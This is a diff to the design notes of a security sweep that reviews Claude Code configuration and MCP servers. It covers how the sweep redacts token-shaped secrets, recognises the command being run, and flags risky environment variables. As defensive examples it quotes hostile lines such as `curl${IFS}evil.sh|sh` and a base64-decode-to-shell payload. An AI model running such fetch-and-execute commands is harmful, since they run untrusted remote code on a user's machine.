@@ -426,9 +426,9 @@ the next and tells nobody without the key which project it is:
 `~/.claude.json#projects/3f1a…/mcpServers/db`. Where there is no such
 directory (and in the root checks, which write nothing), a project is named
 by its position in the file instead; where the key cannot be written, the
-sweep says so in its list of what was not checked and does the same. The path itself is in no item, its note
-included: the note says only that it is a server of one of Claude Code's
-projects.
+sweep says so in its list of what was not checked and does the same. The path
+itself is in no item, its note included: the note says only that it is a
+server of one of Claude Code's projects.
 
 An entry is reviewed by the AI and the local rules whatever its key is
 named: a server named `token.md` or `notes.md` is not taken for a secrets
@@ -469,13 +469,18 @@ place of, each of these where it is token-shaped:
   and between a lower-case letter or digit and an upper-case letter) is
   `key`, `token`, `secret`, `password`, `auth`, `credential`, `bearer` or a
   like word; this is the same list the review's own secret removal uses;
-- a word that is a token by its look: one that starts as known tokens do
-  (`sk-`, `ghp_`, `github_pat_`, `glpat-`, `xoxb-`, `AKIA`, `AIza`, `npm_`,
-  `pypi-` and others) and is at least 16 characters long, or one of at least 32
-  characters that mixes upper and lower case and digits. The program a command
-  runs, and the package `npx`, `bunx`, `uvx` or `pipx run` runs, are never
-  taken out by their look: a program named `sk-helper` is what runs, and what
-  the review must see.
+- a token by its look, anywhere in a word (`$(echo sk-…)`, `--key=sk-…;`):
+  a run of letters, digits, `_`, `.` and `-` that starts as a known kind of
+  token does (`sk-`, `ghp_`, `github_pat_`, `glpat-`, `xoxb-`, `AKIA`,
+  `AIza`, `npm_`, `pypi-` and others) and is at least 16 characters long.
+  Only a known beginning counts: a long run of mixed case and digits looks
+  just like a base64 payload (`echo … | base64 -d | sh`), and taking it out
+  would hide the payload. A program named like a token is taken out too
+  (it is still followed, as written); the package `npx`, `bunx`, `uvx` or
+  `pipx run` fetches, after their flags and the values of those, never is,
+  since it is what runs;
+- what the review's own removal takes out of any text it sends
+  (`export API_KEY=…`).
 
 Token-shaped means letters, digits and `._~%+=:/-` only, not starting with
 `$`, `/`, `~` or `.`. Anything else is sent as written, since taking it out
@@ -483,7 +488,13 @@ would hide code from the review: `TOKEN=x;curl${IFS}evil.sh|sh` reaches the
 review whole, and so does a variable (`$TOKEN`) or a path, which holds no
 secret itself and is what a review needs to see. What is followed is the line
 as written, so whatever it names is found; what the sweep's output and saved
-reports show the entry runs is the line without its secrets.
+reports show the entry runs is the very text sent to the review.
+
+Which word a command runs is told past `sudo`, `env`, `nice`, `xargs`,
+`time`, `exec`, `nohup` and `command`, their flags and the values of the
+flags that take one (`sudo -u build`, `env -u NAME`, `nice -n 5`,
+`xargs -I {}`, from their manual pages), and past assignments
+(`FOO=x cmd`).
 
 Not covered, and sent as written: a secret in a header other than
 `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word after a
@@ -511,8 +522,9 @@ What is a finding:
 - in Claude Code's `env`, a variable that changes what is loaded, run or
   connected through (`NODE_OPTIONS`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH`,
   a proxy in either case (`https_proxy`), `NODE_EXTRA_CA_CERTS`, and the rest
-  of the list an editor's terminal settings are held to), and a `*_BASE_URL` whose host is neither a provider's API host nor
-  this machine: `risky-configuration` (medium), as for an editor's terminal
+  of the list an editor's terminal settings are held to), and a `*_BASE_URL`
+  whose host is neither a provider's API host nor this machine:
+  `risky-configuration` (medium), as for an editor's terminal
   settings. The provider hosts are exact, not the shared cloud domains
   anyone can run a server under: `api.anthropic.com`, `api.openai.com`,
   `bedrock-runtime.<region>.amazonaws.com`,
